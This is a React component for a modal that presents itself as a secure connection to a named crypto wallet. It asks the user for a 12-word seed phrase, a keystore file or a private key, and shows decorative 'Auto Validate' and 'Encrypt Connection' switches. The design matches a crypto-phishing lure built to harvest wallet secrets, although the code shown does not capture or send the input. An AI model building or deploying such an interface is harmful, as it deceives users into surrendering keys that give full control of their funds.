import React, { useState } from "react";
import {
  Box,
  Typography,
  Tabs,
  Tab,
  TextField,
  Button,
  Modal,
} from "@mui/material";
import { SwitchIos } from "./mui-treasury/switch-ios";
import SquareProgress from "./components/square-progress";

const WalletModal = ({ open, onClose, selectedWallet }) => {
  const [tabValue, setTabValue] = useState(0);

  const handleTabChange = (event, newValue) => {
    setTabValue(newValue);
  };

  return (
    <Modal
      open={open}
      onClose={onClose}
      aria-labelledby="wallet-connect-modal"
      aria-describedby="wallet-connect-description"
    >
      <Box
        sx={{
          position: "absolute",
          top: "50%",
          left: "50%",
          transform: "translate(-50%, -50%)",
          width: 320,
          bgcolor: "#f5f5f5",
          borderRadius: "40px",
          boxShadow: 24,
          p: 3,
          maxHeight: "90vh",
          overflowY: "auto",
          overflowX: "hidden",
        }}
        className="custom-scrollbar"
      >
        <Typography
          variant="h6"
          component="h2"
          align="center"
          sx={{ mb: 1, color: "#333", fontSize: "1.1rem" }}
        >
          {selectedWallet?.name}
        </Typography>
        <Box
          sx={{
            display: "flex",
            justifyContent: "center",
            mb: 1,
            position: "relative",
            width: 80,
            height: 80,
            margin: "0 auto",
          }}
        >
          <SquareProgress size={80} thickness={3} color="#3498db" />

          <Box
            sx={{
              position: "absolute",
              top: 4,
              left: 4,
              right: 4,
              bottom: 4,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              borderRadius: "4px",
              overflow: "hidden",
              backgroundColor: "white",
            }}
          >
            <img
              src={selectedWallet?.image}
              alt={selectedWallet?.name}
              width="56"
              height="56"
              style={{ objectFit: "contain" }}
            />
          </Box>
        </Box>
        <Typography
          variant="body2"
          align="center"
          sx={{ mb: 1, color: "#666", fontSize: "0.8rem" }}
        >
          Initializing secure connection with {selectedWallet?.name}
        </Typography>
        <Box
          sx={{
            display: "flex",
            justifyContent: "space-between",
            mb: 1,
            alignItems: "center",
          }}
        >
          <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
            Auto Validate
          </Typography>
          <SwitchIos defaultChecked />
        </Box>
        <Box
          sx={{
            display: "flex",
            justifyContent: "space-between",
            mb: 1,
            alignItems: "center",
          }}
        >
          <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>
            Encrypt Connection
          </Typography>
          <SwitchIos defaultChecked />
        </Box>
        <Tabs
          value={tabValue}
          onChange={handleTabChange}
          sx={{
            mb: 1,
            "& .MuiTab-root": {
              minWidth: 0,
              padding: "6px 12px",
              fontSize: "0.8rem",
            },
          }}
        >
          <Tab label="Phrase" />
          <Tab label="Keystore JSON" />
          <Tab label="Private Key" />
        </Tabs>
        {tabValue === 0 && (
          <>
            <TextField
              fullWidth
              label="Enter your wallet address"
              variant="outlined"
              margin="dense"
              size="small"
              sx={{ "& .MuiInputLabel-root": { fontSize: "0.8rem" },"& .MuiOutlinedInput-root": {
                borderRadius: "8px",
              }, }}
            />
            <Box
              sx={{
                display: "grid",
                gridTemplateColumns: "repeat(3, 1fr)",
                gap: 1,
                mt: 1,
                p: 1,
                border: "1px solid #999",
                borderRadius: "8px",
              }}
            >
              {[...Array(12)].map((_, index) => (
                <TextField
                  key={index}
                  size="small"
                  placeholder={`Word ${index + 1}`}
                  variant="outlined"
                  inputProps={{ style: { fontSize: "0.8rem", padding: "6px", paddingLeft: "16px" } }}
                  sx={{
                    "& .MuiOutlinedInput-root": {
                      borderRadius: "8px", 
                    },
                  }}
                />
              ))}
            </Box>
          </>
        )}
        {tabValue === 1 && (
          <TextField
            fullWidth
            label="Keystore JSON"
            variant="outlined"
            margin="dense"
            multiline
            rows={3}
            size="small"
            sx={{ "& .MuiInputLabel-root": { fontSize: "0.8rem" }, "& .MuiOutlinedInput-root": {
                  borderRadius: "8px","& .MuiOutlinedInput-root": {
                    borderRadius: "8px", // Add border radius here
                  }, // Add border radius here
                }, }}
          />
        )}
        {tabValue === 2 && (
          <TextField
            fullWidth
            label="Private Key"
            variant="outlined"
            margin="dense"
            size="small"
            sx={{ "& .MuiInputLabel-root": { fontSize: "0.8rem" }, "& .MuiOutlinedInput-root": {
              borderRadius: "8px", // Add border radius here
            }, }}
          />
        )}
        <Typography
          variant="caption"
          display="block"
          sx={{ mt: 1, mb: 1, color: "#666", fontSize: "0.7rem" }}
        >
          Typically 12 (sometimes 24) words separated by a single space
        </Typography>
        <Button
          fullWidth
          variant="contained"
          onClick={onClose}
          sx={{
            backgroundColor: "#3498db",
            color: "white",
            fontWeight: "bold",
            padding: "8px",
            fontSize: "0.9rem",
            "&:hover": {
              backgroundColor: "#2980b9",
            },
          }}
        >
          Import root pair
        </Button>
      </Box>
    </Modal>
  );
};

export default WalletModal;
